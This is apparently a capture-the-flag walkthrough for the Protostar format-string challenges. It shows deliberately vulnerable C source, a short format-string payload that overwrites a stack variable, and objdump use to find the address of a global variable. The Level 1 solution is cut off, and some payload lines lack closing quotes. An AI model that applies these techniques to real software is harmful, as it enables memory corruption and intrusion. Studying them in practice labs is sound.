These are the solutions and walkthroughs for the Format set of challenges in the Protostar Wargame.

Level 0 -
This is the first challenge of the format set which is based around using format strings. In this first challenge the
task is to change a value to equal deadbeef. This is very similar to the narnia challenge from overthewire. The
source code for the challenge is here

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
 volatile int target;
 char buffer[64];

 target = 0;

 sprintf(buffer, string);

 if(target == 0xdeadbeef) {
  printf("you have hit the target correctly :)\n");
 }
}

int main(int argc, char **argv)
{
 vuln(argv[1]);
}

The solution that would be normally used will have to be modified as there is a restriction which is that the
solution should be done in less than 10 bytes of input. This means that instead of using the obvious

python -c 'print "A"*64+"\xef\xbe\xad\xde

there will have to be some modification. There are some great materials available on string formating attacks which
include this tutorial
http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html
Due to hex formatting the solution in order to be valid will have to change to

python -c 'print "%64d\xef\xbe\xad\xde

Not hugely different but enough to pass the challenge.



Level 1 - 
In the second challenge there is a c file containing the following code 

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
 printf(string);

 if(target) {
  printf("you have modified the target :)\n");
 }
}

int main(int argc, char **argv)
{
 vuln(argv[1]);
}

It is within this code that there should be a vulnerability to exploit. There is a very good if slightly old
tutorial on exploiting format strings at - 
https://www.exploit-db.com/papers/13239/
The main goal of the task is to change the value of the variable called target to any non zero value so it is from
there that things must begin. Also it can be assumed that there will need to be a certain amount of code injected
in order to reach the 'target' variable so the first step must be to find out where the 'target' is located in
memory. Again there are a couple of ways of doing this either using objdump or else using gdb

objdump -t format1 | grep target -this given the following output
08049638 g     O .bss	00000004              target

The above output will form part of the solution, now that the address is found it is the amount of code to be 
injected that is to be sought. 

